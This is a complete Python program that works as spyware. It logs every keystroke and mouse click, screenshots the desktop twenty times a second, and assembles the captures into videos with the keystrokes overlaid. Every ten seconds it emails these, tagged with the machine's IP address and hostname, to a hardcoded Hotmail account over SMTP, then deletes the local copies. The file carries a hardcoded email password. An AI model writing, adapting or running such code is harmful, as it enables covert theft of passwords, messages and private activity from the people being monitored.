import pyautogui
import cv2
import numpy as np
import os
import shutil
import time
import socket
import platform
from threading import Thread, Event
from pynput import keyboard, mouse
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText
from datetime import datetime
import pytz
import random


EMAIL_ADDRESS = 'python-logger@hotmail.com'  
EMAIL_PASSWORD = '9f8a23e7-dcb6-4b8b-bf32-92f5a174e4c1'  
RECIPIENT_ADDRESS = 'python-logger@hotmail.com'  
DEVICE_NAME = platform.node()
IDENTIFICATION_CODE = random.randint(10000, 99999)


SCREENSHOT_INTERVAL = 1 / 20  
VIDEO_CREATION_INTERVAL = 10


VIDEO_OUTPUT_FILE = 'output.mp4'  
VIDEO_FPS = 20  


LOG_FILE = 'log.txt'  
TOTAL_LOG_FILE = 'total.txt'  
SCREENSHOT_FOLDER = 'recording_folder'  


def get_device_info():
    
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
    except Exception as e:
        ip_address = "Unknown IP"
    
    
    device_type = platform.system() + " " + platform.release()

    return ip_address, device_type

DEVICE_IP, DEVICE_TYPE = get_device_info()
EMAIL_SUBJECT = f"Logging from {DEVICE_TYPE} ({DEVICE_IP}) (ID: {IDENTIFICATION_CODE}) (Device Name: {DEVICE_NAME})"


def create_folder(folder_name):
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
    return folder_name


def screen_capture(folder_name, capture_interval):
    while True:
        screenshot = pyautogui.screenshot()
        
        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

        
        mouse_x, mouse_y = pyautogui.position()
        cv2.circle(frame, (mouse_x, mouse_y), 10, (0, 0, 255), 2)

        
        timestamp = int(time.time() * 1000)
        cv2.imwrite(os.path.join(folder_name, f'screenshot_{timestamp}.png'), frame)
        time.sleep(capture_interval)


def create_video_from_images(folder_name, output_video, fps):
    images = [img for img in os.listdir(folder_name) if img.endswith(".png")]
    images.sort()  

    if not images:
        print("No images found to create a video.")
        return None

    
    first_image = cv2.imread(os.path.join(folder_name, images[0]))
    height, width, _ = first_image.shape

    
    log_width = 400  
    timeline_height = 50  
    new_width = width + log_width
    new_height = height + timeline_height

    
    video_writer = cv2.VideoWriter(output_video, cv2.VideoWriter_fourcc(*'mp4v'), fps, (new_width, new_height))

    
    log_data = read_log_file(LOG_FILE)

    
    pst_timezone = pytz.timezone('America/Los_Angeles')

    
    total_frames = len(images)
    print(f"Total frames to be written: {total_frames}")

    
    for i, img_file in enumerate(images):
        img = cv2.imread(os.path.join(folder_name, img_file))
        log_img = np.zeros((height, log_width, 3), dtype=np.uint8)  

        
        frame_time = int(img_file.split('_')[1].split('.')[0])

        
        log_entries = [entry for timestamp, entry in log_data if frame_time - 1000 <= timestamp <= frame_time]
        log_text = log_entries[-20:]  

        
        y0, dy = 20, 30
        for j, line in enumerate(log_text):
            y = y0 + j * dy
            cv2.putText(log_img, line, (10, y), cv2.FONT_HERSHEY_SIMPLEX, 0.7, (255, 255, 255), 2)  

        
        timeline_img = np.zeros((timeline_height, new_width, 3), dtype=np.uint8)  

        
        current_time_pst = datetime.fromtimestamp(frame_time / 1000, pst_timezone).strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]  
        font_scale = 1.2  
        font_thickness = 2  
        text_size = cv2.getTextSize(current_time_pst, cv2.FONT_HERSHEY_SIMPLEX, font_scale, font_thickness)[0]
        text_x = (new_width - text_size[0]) // 2  
        text_y = (timeline_height + text_size[1]) // 2  
        cv2.putText(timeline_img, current_time_pst, (text_x, text_y), cv2.FONT_HERSHEY_SIMPLEX, font_scale, (255, 255, 255), font_thickness)  

        
        combined_top = np.hstack((img, log_img))  
        combined_frame = np.vstack((combined_top, timeline_img))  

        
        video_writer.write(combined_frame)

    video_writer.release()
    print(f"Video successfully created: {output_video}")
    return output_video



def read_log_file(log_file):
    log_entries = []
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            for line in f:
                try:
                    
                    timestamp_str, log_msg = line.split(' ', 1)
                    timestamp = int(timestamp_str)
                    log_entries.append((timestamp, log_msg.strip()))
                except ValueError:
                    continue  
    return log_entries


def key_mouse_logger(log_file, total_log_file, stop_event=None):
    def log_event(event_type, event_details):
        timestamp = int(time.time() * 1000)
        log_entry = f'{timestamp} {event_type}: {event_details}\n'
        
        with open(log_file, 'a') as f:
            f.write(log_entry)
        
        with open(total_log_file, 'a') as f:
            f.write(log_entry)

    def on_press(key):
        log_event('Key Pressed', key)

    def on_click(x, y, button, pressed):
        if pressed:
            log_event('Mouse Clicked', f'at ({x}, {y}) with {button}')

    
    with keyboard.Listener(on_press=on_press) as key_listener, mouse.Listener(on_click=on_click) as mouse_listener:
        if stop_event:
            stop_event.wait()  
        key_listener.stop()
        mouse_listener.stop()


def send_email_with_attachments(subject, body, attachments):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_ADDRESS
    msg['Subject'] = subject 

    msg.attach(MIMEText(body, 'plain'))

    
    for file in attachments:
        attachment = MIMEBase('application', 'octet-stream')
        with open(file, 'rb') as f:
            attachment.set_payload(f.read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file)}')
        msg.attach(attachment)

    
    try:
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")


def cleanup(folder_name):
    if os.path.exists(folder_name):
        shutil.rmtree(folder_name)


def delete_files(files):
    for file in files:
        if os.path.exists(file):
            os.remove(file)


def ensure_log_file(log_file):
    if not os.path.exists(log_file):
        with open(log_file, 'w') as f:
            pass  


def periodic_tasks(folder_name, interval, log_file, total_log_file):
    while True:
        
        time.sleep(interval)

        
        output_video = create_video_from_images(folder_name, VIDEO_OUTPUT_FILE, VIDEO_FPS)
        
        if output_video:
            
            ensure_log_file(log_file)
            ensure_log_file(total_log_file)
            
            
            current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            email_body = f"Recording Time: {current_time}"

            
            send_email_with_attachments(
                subject=EMAIL_SUBJECT,
                body=email_body,
                attachments=[output_video, log_file, total_log_file]  
            )
            
            
            delete_files([log_file, output_video])
            cleanup(folder_name)
            create_folder(folder_name)  


def main():
    folder_name = create_folder(SCREENSHOT_FOLDER)
    stop_event = Event()

    
    screen_thread = Thread(target=screen_capture, args=(folder_name, SCREENSHOT_INTERVAL))
    key_mouse_logger_thread = Thread(target=key_mouse_logger, args=(LOG_FILE, TOTAL_LOG_FILE, stop_event))
    periodic_thread = Thread(target=periodic_tasks, args=(folder_name, VIDEO_CREATION_INTERVAL, LOG_FILE, TOTAL_LOG_FILE))

    
    screen_thread.start()
    key_mouse_logger_thread.start()
    periodic_thread.start()

    
    screen_thread.join()

    
    stop_event.set()
    key_mouse_logger_thread.join()

if __name__ == "__main__":
    main()
